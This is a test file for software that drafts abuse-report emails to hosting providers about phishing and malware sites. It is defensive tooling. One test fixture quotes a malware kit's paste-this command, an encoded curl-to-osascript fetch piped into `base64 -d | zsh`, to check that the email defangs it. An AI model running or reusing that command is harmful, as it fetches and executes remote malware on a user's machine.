import { describe, expect, test } from "bun:test";

import { readVerifiedEmailDraft } from "../mail/draft";
import { createOriginHostEmailDraft } from "./draft";
import { originHostSnapshotSchema, type OriginHostSnapshot } from "./snapshot";

const certificate = (names: string[], fingerprint256: string) => ({
	names,
	notBefore: "2026-10-28T18:18:00.000Z",
	notAfter: "2027-01-26T18:18:00.000Z",
	issuer: "C=US, O=Let's Encrypt, CN=E7",
	fingerprint256,
});

function snapshot(overrides: Partial<OriginHostSnapshot> = {}): OriginHostSnapshot {
	return originHostSnapshotSchema.parse({
		kind: "cloudflare_origin_host",
		version: 2,
		recipient: "abuse@host.example.com",
		providerLabel: "Example Hosting",
		originalDomain: "login.example.com",
		sourceMessageId: "1",
		observedAt: "2026-10-30T22:00:00.000Z",
		networks: [{ asn: 64500, holder: "EXAMPLE", prefixes: ["8.8.8.0/24"], discoverySources: ["registry_name_search"] }],
		scan: { addressesScanned: 256, totalAddresses: 256, truncated: false, selectedPrefixes: [{ asn: 64500, prefix: "8.8.8.0/24" }], completedAt: "2026-10-30T22:49:00.000Z" },
		servers: [],
		kit: { abuse: "credential_theft", collects: ["sign-in email or phone", "password"], exfiltrationProbed: true, exfiltrationTargets: [] },
		fingerprints: [],
		siblingCandidateCount: 0,
		siblings: [],
		errors: [],
		...overrides,
	});
}

function draft(value: OriginHostSnapshot, attachmentNames: string[] = []) {
	return createOriginHostEmailDraft({ report: { id: 1n, submissionId: 2n }, route: { resolutionSnapshot: value }, attachmentNames })!;
}

describe("origin-host email draft", () => {
	test("ignores routes without an origin-host snapshot", () => {
		expect(createOriginHostEmailDraft({ report: { id: 1n, submissionId: 2n }, route: { resolutionSnapshot: { kind: "other" } } })).toBeUndefined();
	});

	test("reads a snapshot with every fingerprint a real capture records", () => {
		// assistdeparments-x.com (production route 378905878629191859, 2026-11-11): 31 fingerprints, the X web bundle.
		// The schema allowed 5, so the draft fell back to the generic resolver template.
		const fingerprints = Array.from({ length: 31 }, (_, index) => ({
			sha256: index.toString(16).padStart(64, "0"),
			kind: "script" as const,
			url: `https://assistdeparments-x.com/xgabs/x-web/x-web/assets/${index}.js?v=v2.2.3`,
			size: 2_000 + index,
		}));
		const sibling = {
			domain: "x-login-help.com",
			url: "https://x-login-help.com/",
			matchingHashes: fingerprints.slice(0, 12).map(({ sha256 }) => sha256),
			originIp: "8.8.8.8",
			certificate: certificate(["x-login-help.com"], "BB"),
			submissionId: "3",
		};
		const value = { ...snapshot(), providerLabel: "SKN-NETWORK-1 - SKN Subnet & Telecom Ltd, KN", fingerprints, siblings: [sibling] };
		expect(originHostSnapshotSchema.safeParse(value).success).toBeTrue();
		const { body } = draft(value as OriginHostSnapshot);
		expect(body).toStartWith("Hello Skn-Network-1 - Skn Subnet & Telecom Ltd, KN Abuse Team,");
		expect(body).toContain("Cloudflare named you as the host of the phishing site login.example.com");
		expect(body).not.toContain("Public resolver data");
		expect(originHostSnapshotSchema.safeParse({ ...value, fingerprints: [...fingerprints, ...fingerprints, ...fingerprints] }).success).toBeFalse();
	});

	test("asks the host to find the service when the sweep found no server", () => {
		const { subject, body } = draft(snapshot());
		expect(subject).toEndWith("Phishing abuse: credential phishing kit for login.example.com");
		expect(body).toContain("Cloudflare named you as the host of the phishing site login.example.com, which steals account credentials.");
		expect(body).not.toContain("We checked");
		expect(body).not.toContain("public IPv4 addresses");
		expect(body).not.toContain("\n\n\n");
		expect(body).toContain("1. Identify and suspend the service hosting login.example.com.");
		expect(body).not.toContain("openssl");
		expect(body).toContain("The hosting service therefore holds live victim credentials.");
	});

	test("lists every server and flags differing certificates", () => {
		const { subject, body } = draft(snapshot({
			servers: [
				{ ip: "8.8.8.1", asn: 64500, prefix: "8.8.8.0/24", certificate: certificate(["login.example.com"], "AA") },
				{ ip: "8.8.8.2", asn: 64500, prefix: "8.8.8.0/24", certificate: certificate(["login.example.com"], "BB") },
			],
		}));
		expect(subject).toContain("credential phishing kit on 2 servers");
		expect(body).toContain("2 servers in your network run a phishing operation that steals account credentials. Please suspend them and preserve their data");
		expect(body).toContain("Servers:\n- 8.8.8.1 (8.8.8.0/24, AS64500)\n- 8.8.8.2 (8.8.8.0/24, AS64500)");
		expect(body).toContain("The other servers present certificates for the same domain; the attached evidence lists each fingerprint.");
		expect(body).toContain("1. Suspend the servers.");
	});

	test("caps the body's domain list and defers the rest to the evidence file", () => {
		const siblings = Array.from({ length: 60 }, (_, index) => ({
			domain: `kit-${index}.example.net`,
			url: `https://kit-${index}.example.net/`,
			matchingHashes: ["a".repeat(64)],
			originIp: "8.8.8.1",
			certificate: certificate([`kit-${index}.example.net`], `F${index}`),
			submissionId: String(100 + index),
		}));
		const { body } = draft(snapshot({
			servers: [{ ip: "8.8.8.1", certificate: certificate(["login.example.com"], "AA") }],
			siblings,
		}));
		expect(body).toContain("- kit-38.example.net\n- and 21 more, listed in the attached evidence");
		expect(body).toContain("  SHA-256 F8\n- the certificates of the other 51 domains are in the attached evidence\nYou can check this with");
		expect(body).not.toContain("SHA-256 F9\n");
		expect(body).not.toContain("- kit-39.example.net");
		expect(body).toContain("The other 60 domains serve byte-identical kit files");
		expect(body).toContain("1. Suspend the server, so all 61 domains go offline at once.");
		// The stored draft must remain resendable after a delivery failure.
		const resend = readVerifiedEmailDraft({
			kind: "verified_email_report",
			version: 2,
			target: "8.8.8.1",
			observedUrls: [],
			recipient: "abuse@host.example.com",
			email: { subject: "s", body, recipientLabel: "Example Hosting" },
		}, { recipient: "abuse@host.example.com", description: "unrelated", allowedUrls: ["https://phishing.support", "https://phishing.support/submissions/2"] });
		expect(resend?.body).toBe(body);
	});

	test("describes malware distribution without credential claims", () => {
		const { subject, body } = draft(snapshot({
			servers: [{ ip: "8.8.8.1", certificate: certificate(["login.example.com"], "AA") }],
			kit: { abuse: "malware", evidenceQuote: "Update your browser", collects: [], exfiltrationProbed: false, exfiltrationTargets: [] },
		}));
		expect(subject).toContain("Malware abuse: malware distribution site on 8.8.8.1");
		expect(body).toContain("runs a malware distribution operation that delivers malware to visitors");
		expect(body).not.toContain("phishing operation");
		expect(body).toContain('What the kit does: it pushes visitors to download, install or run something. The page reads: "Update your browser"');
		expect(body).not.toContain("victims who need to be warned");
	});

	test("quotes a pasted command without a runnable chain or a link, so the draft passes its own check", () => {
		// Production case 380697679325302795: the quote held the kit's decoy App Store URL and
		// `| base64 -d | zsh`; the verified-draft check refused the mail to the origin host.
		const command = `echo "https://apps.apple.com/app/macmorrow-install"; echo 'Y3VybCAtc2ZMIGh0dHBzOi8va2V5Y2hhaW5hZ2VudC5wcm8vd2tzeGdqL3lYMWZRV0ZHdzlycCB8IG9zYXNjcmlwdCAtbCBKYXZhU2NyaXB0' | base64 -d | zsh`;
		const value = snapshot({
			originalDomain: "macmorrow.app",
			servers: [{ ip: "8.8.8.1", certificate: certificate(["macmorrow.app"], "AA") }],
			kit: { abuse: "malware", evidenceQuote: command, collects: [], exfiltrationProbed: false, exfiltrationTargets: [] },
		});
		const email = draft(value);
		expect(email.body).toContain(`The page reads: "echo "apps.apple.com/app/macmorrow-install" [then] echo 'Y3VybCAtc2ZMIGh0dHBzOi8va2V5Y2hhaW5hZ2VudC5wcm8vd2tzeGdqL3lYMWZRV0ZHdzlycCB8IG9zYXNjcmlwdCAtbCBKYXZhU2NyaXB0' [pipe] base64 -d [pipe] zsh"`);
		expect(email.body).not.toMatch(/\|\s*(?:z|ba)?sh\b/);
		expect(email.body).not.toContain("https://apps.apple.com");
		// The worker re-reads the stored draft with the case's allowed links before sending.
		const payload = { kind: "verified_email_report", target: "macmorrow.app", observedUrls: ["https://macmorrow.app/"], recipient: value.recipient, email };
		expect(readVerifiedEmailDraft(payload, {
			recipient: value.recipient,
			description: "The page distributes malware.",
			target: "macmorrow.app",
			observedUrls: ["https://macmorrow.app/"],
			allowedUrls: ["https://phishing.support", "https://macmorrow.app/", "https://phishing.support/submissions/2"],
		})).toEqual(email);
	});
});
